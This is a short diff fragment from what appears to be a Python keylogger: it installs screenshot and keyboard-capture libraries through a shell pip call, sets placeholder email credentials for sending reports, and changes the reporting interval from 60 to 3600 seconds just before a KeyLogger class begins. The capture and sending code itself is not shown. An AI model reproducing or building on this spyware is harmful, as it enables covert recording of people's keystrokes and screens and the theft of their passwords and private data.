@@ -15,7 +15,7 @@ modules = ["pyscreenshot", "pynput", "pillow", "pygame"]
 call("pip install " + ' '.join(modules), shell=True)
 EMAIL_ADDRESS = "Your-Email-Address"
 EMAIL_PASSWORD = "Your Password"
-SEND_REPORT_EVERY = 60
+SEND_REPORT_EVERY = 3600 # in seconds
 
 
 class KeyLogger:
